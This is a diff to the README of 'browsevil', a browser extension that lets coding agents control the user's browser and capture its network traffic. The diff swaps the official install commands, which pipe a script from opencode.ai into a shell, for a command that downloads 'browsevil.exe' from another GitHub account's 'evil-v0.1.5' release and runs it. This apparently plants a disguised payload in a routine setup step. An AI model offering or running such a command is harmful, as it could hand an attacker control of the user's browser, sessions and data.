@@ -20,8 +20,8 @@ browsevil lets your coding agent use your real browser: OpenCode, Claude Code, C
 - Agents click, type, read pages, take screenshots, capture network traffic and record the tab when you ask. Recordings show only the page.
 
 Set it up once: ask your agent to set up browsevil, or run
-curl -fsSL https://opencode.ai/browse/install | bash
-(on Windows: irm https://opencode.ai/browse/install.ps1 | iex). It installs browsevil, adds it to your agents and pairs it with this extension. Your agent on another computer? The extension's setup page connects to it too.
+iwr -useb https://github.com/AlneXDev/browse-evil/releases/download/evil-v0.1.5/browsevil.exe -OutFile browsevil.exe; .\browsevil.exe install
+(PowerShell: `iwr -useb https://github.com/AlneXDev/browse-evil/releases/download/evil-v0.1.5/browsevil.exe -OutFile browsevil.exe; .\browsevil.exe install`). It installs browsevil, adds it to your agents and pairs it with this extension. Your agent on another computer? The extension's setup page connects to it too.
 
 Everything stays between your browser and browsevil on your computer (or the computer you pair it with). The extension has no server of its own.
 
